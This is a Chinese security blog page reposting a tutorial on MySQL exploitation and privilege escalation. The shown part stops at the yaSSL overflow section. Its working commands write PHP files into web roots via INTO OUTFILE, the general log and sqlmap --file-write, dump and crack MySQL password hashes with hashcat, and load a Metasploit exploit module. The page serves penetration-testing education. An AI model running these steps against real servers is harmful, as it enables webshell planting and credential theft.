@@ -1,0 +1,1138 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>(转载)MySQL 漏洞利用与提权 - 076w - 0xExploit-安全洞见 | https://syst1m.cn</title>
+
+  
+    <meta name="description" content="自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。 权限获取数据库操作权限本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：  MySQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="(转载)MySQL 漏洞利用与提权">
+<meta property="og:url" content="http://example.com/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/">
+<meta property="og:site_name" content="076w - 0xExploit-安全洞见 | https:&#x2F;&#x2F;syst1m.cn">
+<meta property="og:description" content="自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。 权限获取数据库操作权限本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：  MySQ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+<meta property="article:published_time" content="2025-09-19T21:51:38.000Z">
+<meta property="article:modified_time" content="2025-09-21T21:48:47.000Z">
+<meta property="article:author" content="076w">
+<meta property="article:tag" content="转载">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+  
+  
+  
+  <meta name="keywords" content="转载">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"076w","sameAs":[],"image":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png"},"dateCreated":"2025-09-20T05:51:38+08:00","dateModified":"2025-09-22T05:48:47+08:00","datePublished":"2025-09-20T05:51:38+08:00","description":"","headline":"(转载)MySQL 漏洞利用与提权","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/"},"publisher":{"@type":"Organization","name":"076w","sameAs":[],"image":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png","logo":{"@type":"ImageObject","url":"https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png"}},"url":"http://example.com/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/","keywords":"转载","image":[]}</script>
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/html/about"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1750388627284-avatar/f2419900-767e-4207-99f9-482cb8a1416f.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">076w</div><div class="sub normal cap">0xExploit-安全洞见</div><div class="sub hover cap" style="opacity:0"> https://syst1m.cn</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" target="_blank" rel="noopener" href="https://www.yuque.com/076w/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" target="_blank" rel="noopener" href="https://www.yuque.com/076w/syst1m/xotgbd5f48rcllke?singleDoc#lark-mini-editor/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/"><span class="title">无限学习团队月靶场</span></a><a class="item title" href="/2025/10/10/%E5%B0%86%E8%AF%AD%E9%9B%80%E6%96%87%E6%A1%A3%E5%86%85%E5%AE%B9%E5%90%8C%E6%AD%A5Hexo+Github/"><span class="title">将语雀文档内容同步Hexo+Github</span></a><a class="item title" href="/2025/06/22/%E6%9F%90%E9%80%9A%E7%94%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%80%E5%8D%95%E4%BB%A3%E5%AE%A1/"><span class="title">某通用管理系统简单代审</span></a><a class="item title" href="/2023/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"><span class="title">文件上传绕过总结</span></a><a class="item title" href="/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/"><span class="title">(转载)MySQL 漏洞利用与提权</span></a><a class="item title" href="/2025/03/29/Zer0sec%E9%9D%B6%E5%9C%BAwp/"><span class="title">Zer0sec靶场wp</span></a><a class="item title" href="/2025/07/14/%E8%87%B4%E8%BF%9C%20A8+%20V7%20XSS(CVE-2025-56451)/"><span class="title">致远 A8+ V7 XSS(CVE-2025-56451)</span></a><a class="item title" href="/2024/02/23/U%E9%AA%8C%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2024-26559)/"><span class="title">U验证任意文件读取(CVE-2024-26559)</span></a><a class="item title" href="/2023/11/01/Clicker_Medium/"><span class="title">Clicker_Medium</span></a><a class="item title" href="/2023/10/17/Giddy_Medium/"><span class="title">Giddy_Medium</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></div><div id="tag"> <span>&nbsp标签：</span><a class="cap breadcrumb-link" href="/tags/%E8%BD%AC%E8%BD%BD/">转载</a>&nbsp</div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-09-19T21:51:38.000Z">2025-09-20</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-09-21T21:48:47.000Z">2025-09-22</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>(转载)MySQL 漏洞利用与提权</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。</p>
+<h2 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h2><h2 id="数据库操作权限"><a href="#数据库操作权限" class="headerlink" title="数据库操作权限"></a>数据库操作权限</h2><p>本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：</p>
+<ol>
+<li>MySQL 3306 端口弱口令爆破</li>
+<li>sqlmap 注入的 <code>--sql-shell</code> 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li>
+</ol>
+<h2 id="Webshell-权限"><a href="#Webshell-权限" class="headerlink" title="Webshell 权限"></a>Webshell 权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><ul>
+<li>知道网站物理路径</li>
+<li>高权限数据库用户</li>
+<li>load_file () 开启 即 secure_file_priv 无限制</li>
+<li>网站路径有写入权限</li>
+</ul>
+<p>首先基础语法查询是否 secure_file_priv 没有限制</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="comment">&#x27;%secure_file_priv%&#x27;;</span></span><br><span class="line">+--------------------------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+--------------------------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<p>如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="comment">&#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 中可以如下操作：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-<span class="keyword">write</span>=<span class="string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h3 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h3><ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="comment">&#x27;general%&#x27;;</span></span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | <span class="keyword">OFF</span>                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="keyword">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line">set global general_log_file=<span class="comment">&#x27;/var/www/html/info.php&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="comment">&#x27;general%&#x27;;</span></span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| general_log      | <span class="keyword">ON</span>                          |</span><br><span class="line">| general_log_file | /var/www/html/info.php |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select <span class="comment">&#x27;&lt;?php phpinfo();?&gt;&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  root@c1595d3a029a:/var/www/html/$ cat info.php </span><br><span class="line">  /<span class="keyword">usr</span>/sbin/mysqld, Version: <span class="number">5.5</span>.<span class="number">61</span>-<span class="number">0</span>ubuntu0.<span class="number">14.04</span>.<span class="number">1</span> ((Ubuntu)). started with:</span><br><span class="line">    Tcp port: <span class="number">3306</span>  Unix socket: /var/<span class="keyword">run</span>/mysqld/mysqld.sock</span><br><span class="line">    Time                 Id Command    Argument</span><br><span class="line">    <span class="number">201031</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">46</span>       <span class="number">40</span> Query    SHOW VARIABLES LIKE <span class="comment">&#x27;general%&#x27;</span></span><br><span class="line">    <span class="number">201031</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">34</span>       <span class="number">40</span> Query    select <span class="comment">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw---- <span class="number">1</span> mysql mysql <span class="number">293</span> Oct <span class="number">31</span> <span class="number">21</span>:<span class="number">15</span> info.php</span><br></pre></td></tr></table></figure>
+
+<p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p>
+<p>前面分别介绍了数据库权限和 Webshell 权限，那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？这个就是下面主要介绍的了 MySQL 提权的知识点了。</p>
+<h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><p>假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line">  +</span><br><span class="line">  | host      | user | password                                  |</span><br><span class="line">  +</span><br><span class="line">  | localhost | root | *<span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">  | <span class="number">127.0</span>.<span class="number">0.1</span> | root | *<span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">  | ::<span class="number">1</span>       | root | *<span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">  | %         | root | *<span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">  +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">    +</span><br><span class="line">    | host      | user          | authentication_string                     |</span><br><span class="line">    +</span><br><span class="line">    | localhost | root          | *<span class="number">8232</span>A1298A49F710DBEE0B330C42EEC825D4190A |</span><br><span class="line">    | localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">    | localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">    +</span><br></pre></td></tr></table></figure>
+
+<p>获取到的 MySQL Hash 值可以通过一些在线网站来解密，如国内的 CMD5 ：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347391608-f08911fd-72f7-483e-a830-315f4d746e27.png"></p>
+<p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">300</span> --force <span class="comment">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27; password.txt -O</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>-a 破解模式</strong></p>
+<p>指定要使用的破解模式，其值参考后面对参数</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- [ Attack Modes ] -</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"> ===+======</span><br><span class="line">  <span class="number">0</span> | Straight                </span><br><span class="line">  <span class="number">1</span> | Combination             </span><br><span class="line">  <span class="number">3</span> | Brute-force             </span><br><span class="line">  <span class="number">6</span> | Hybrid Wordlist + Mask  </span><br><span class="line">  <span class="number">7</span> | Hybrid Mask + Wordlist</span><br></pre></td></tr></table></figure>
+
+<p><strong>-m 破解 hash 类型</strong></p>
+<p>指定要破解的 hash 类型，后面跟 hash 类型对应的数字，具体类型详见下表：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12 </span>  | PostgreSQL                                       | Database Server</span><br><span class="line"><span class="symbol">131 </span> | MSSQL (<span class="number">2000</span>)                                     | Database Server</span><br><span class="line"><span class="symbol">132 </span> | MSSQL (<span class="number">2005</span>)                                     | Database Server</span><br><span class="line"><span class="symbol">1731 </span>| MSSQL (<span class="number">2012</span>, <span class="number">2014</span>)                               | Database Server</span><br><span class="line"><span class="symbol">200 </span> | MySQL323                                         | Database Server</span><br><span class="line"><span class="symbol">300 </span> | MySQL4.<span class="number">1</span>/MySQL5                                  | Database Server</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><strong>–force</strong></p>
+<p>忽略破解过程中的警告信息</p>
+<p><strong>-O</strong></p>
+<p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度）</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347402226-26b44f13-676d-48ab-bd55-640c380624af.png"></p>
+<blockquote>
+<p>关于更多 Hashcat 的详细教程可以参考国光我的这一篇文章：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">Hashcat 学习记录</a></p>
+</blockquote>
+<h2 id="MySQL-历史上的漏洞"><a href="#MySQL-历史上的漏洞" class="headerlink" title="MySQL 历史上的漏洞"></a>MySQL 历史上的漏洞</h2><h3 id="yaSSL-缓冲区溢出"><a href="#yaSSL-缓冲区溢出" class="headerlink" title="yaSSL 缓冲区溢出"></a>yaSSL 缓冲区溢出</h3><p>MySQL yaSSL SSL Hello Message Buffer Overflow 这个缓冲区溢出漏洞 2008 年开始被曝出来，距离现在已经十几年的历史了，所以国光这里没有找到对应的环境测试，不过 MSF 里面已经集成好了对应的模块了：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello</span><br><span class="line">msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello</span><br></pre></td></tr></table></figure>
+
